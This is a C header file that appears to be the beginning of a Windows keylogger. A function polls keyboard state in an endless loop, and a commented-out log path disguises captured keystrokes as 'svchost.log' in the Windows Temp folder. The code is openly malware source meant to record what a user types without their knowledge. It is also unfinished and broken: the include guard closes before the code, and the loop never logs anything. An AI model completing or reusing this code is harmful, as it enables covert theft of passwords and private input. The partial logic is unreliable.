//
// Created by arobot on 7/16/2024.
//

#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#endif //KEYLOGGER_H

// Function to log the keys @ C:\\Windows\\Temp\\svchost.log"
DWORD WINAPI logg() {

    int vkey, last_key_state[0xFF];
    int isCAPSLOCK, isNUMLOCK;
    int isL_SHIFT, isR_SHIFT;
    int isPressed;
    char showKey;
    char NUMCHAR[]=")!@#$%^&*("; // Define the characters to replace numbers
    char chars_vn[]=";=,-./`"; // Define the characters to replace the numbers
    char chars_vs[]=":+<_>?~"; // Define the characters to replace the numbers
    char char_va[]="[]\\'"; // Define the characters to replace the numbers
    char char_vb[]="{|}\""; // Define the characters to replace the numbers

    FILE *kh; // File pointer for the log file
    //char KEY_LOG_FILE[]="C:\\Windows\\Temp\\svchost.log"; // Log file to store the key logs
    char KEY_LOG_FILE2[]="windows.txt"; // Log file to store the key logs

    // Get the state of the last key
    for (vkey=0; vkey<0xFF; vkey++) {
        last_key_state[vkey] = GetAsyncKeyState(vkey);
    }

    while(1) {
        Sleep(10);
        // Get the state of the Capslock key
        isCAPSLOCK = (GetKeyState(VK_CAPITAL) & 1) == 1 ? 1 : 0;
        // Get the state of the Numlock key
        isNUMLOCK = (GetKeyState(VK_NUMLOCK) & 1) == 1 ? 1 : 0;
        // Get the state of the Shift key
        isL_SHIFT = GetAsyncKeyState(VK_LSHIFT) >> ((sizeof(SHORT) * 8) - 1);
        isR_SHIFT = GetAsyncKeyState(VK_RSHIFT) >> ((sizeof(SHORT) * 8) - 1);

        for (vkey=0; vkey<0xFF; vkey++) {
            isPressed =(GetKeyState(vkey)&0xFF00)>0?1:0;
            showKey = (char)vkey;

        }
    }
}